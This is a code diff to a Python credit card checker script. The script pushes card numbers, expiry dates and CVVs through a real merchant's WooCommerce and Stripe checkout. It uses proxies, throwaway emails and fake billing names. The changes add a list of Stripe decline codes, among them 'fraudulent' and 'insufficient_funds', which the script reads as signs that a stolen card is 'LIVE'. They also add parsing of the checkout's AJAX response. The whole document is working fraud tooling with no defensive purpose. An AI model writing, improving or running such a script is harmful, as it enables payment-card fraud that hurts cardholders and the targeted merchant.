@@ -1,13 +1,19 @@
-import requests, re, random, string
+import requests, re, random, string, json
 
 def generate_random_email(length=10):
     chars = string.ascii_lowercase + string.digits
     return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"
 
+# Stripe decline codes that indicate the card is valid (live)
+LIVE_DECLINE_CODES = [
+    "incorrect_cvc", "incorrect_number", "expired_card",
+    "insufficient_funds", "do_not_honor", "fraudulent",
+    "generic_decline", "restricted_card", "pickup_card",
+    "service_not_allowed", "transaction_not_allowed",
+    "try_again_later", "withdrawal_count_limit_exceeded",
+]
+
 def check_st2(cc, mm, yy, cvv, proxy=None):
-    """
-    Returns (is_live: bool, message: str)
-    """
     try:
         mm = mm.zfill(2)
         if len(yy) == 4:
@@ -18,7 +24,7 @@ def check_st2(cc, mm, yy, cvv, proxy=None):
             session.proxies = {"http": proxy, "https": proxy}
         ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
 
-        # 1. Add to cart (AJAX)
+        # 1. Add to cart
         headers1 = {
             'authority': '1337decals.com',
             'accept': '*/*',
@@ -34,9 +40,9 @@ def check_st2(cc, mm, yy, cvv, proxy=None):
         }
         r1 = session.post('https://1337decals.com/wp-admin/admin-ajax.php',
                           params={'claucartf5': '1'}, headers=headers1, data=data1, timeout=15)
-        cart_hash = re.search(r'cart_hash":"([^"]+)"', r1.text)
-        if not cart_hash:
+        if not re.search(r'"success":true', r1.text):
             return False, "Cart add failed"
+
         # 2. Visit cart and checkout
         session.get('https://1337decals.com/cart/', headers={'User-Agent': ua}, timeout=15)
         r3 = session.get('https://1337decals.com/checkout/', headers={'User-Agent': ua}, timeout=15)
@@ -69,10 +75,16 @@ def check_st2(cc, mm, yy, cvv, proxy=None):
         r4 = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=15)
         pm = r4.json()
         if 'id' not in pm:
-            return False, "Stripe PM failed: " + pm.get('error', {}).get('message', 'unknown')
+            # Stripe PM creation error – check for live decline codes
+            error = pm.get('error', {})
+            decline_code = error.get('decline_code', '')
+            msg = error.get('message', 'Unknown error')
+            if decline_code in LIVE_DECLINE_CODES or "security code" in msg.lower():
+                return True, f"LIVE: {msg}"      # card is live
+            return False, f"PM failed: {msg}"
         pm_id = pm['id']
 
-        # 4. Process checkout
+        # 4. Process checkout (AJAX)
         checkout_data = (
             f'wc_order_attribution_source_type=typein&'
             f'billing_email={email}&billing_first_name=exeee&billing_last_name=waysss&'
@@ -96,17 +108,28 @@ def check_st2(cc, mm, yy, cvv, proxy=None):
         r5 = session.post('https://1337decals.com/', params={'wc-ajax': 'checkout'},
                           headers=checkout_headers, data=checkout_data, timeout=20)
 
-        # 5. Get result from final page
+        # 5. Read the AJAX response for Stripe errors
+        try:
+            ajax_data = r5.json()
+            if 'error' in ajax_data:
+                return False, ajax_data['error']
+            # If the response indicates a redirect (order received), it's a success
+            if 'redirect' in ajax_data and ajax_data['redirect']:
+                return True, "Payment successful"
+        except:
+            pass
+
+        # 6. Fallback: scrape the final checkout page
         r6 = session.get('https://1337decals.com/checkout/', headers={'User-Agent': ua}, timeout=15)
         error_match = re.search(r'<ul class="woocommerce-error".*?<li>\s*(.*?)\s*<\/li>', r6.text, re.DOTALL)
         if error_match:
             error_text = error_match.group(1).strip()
-            # Some error messages indicate a live card (e.g. "invalid security code")
             if "security code" in error_text.lower() or "cvc" in error_text.lower():
-                return True, error_text   # Live, CVV wrong
+                return True, error_text   # Live (wrong CVV)
             return False, error_text
         if "thank you" in r6.text.lower() or "order received" in r6.text.lower():
             return True, "Payment successful"
         return False, "Unknown response"
+
     except Exception as e:
         return False, str(e)[:150]
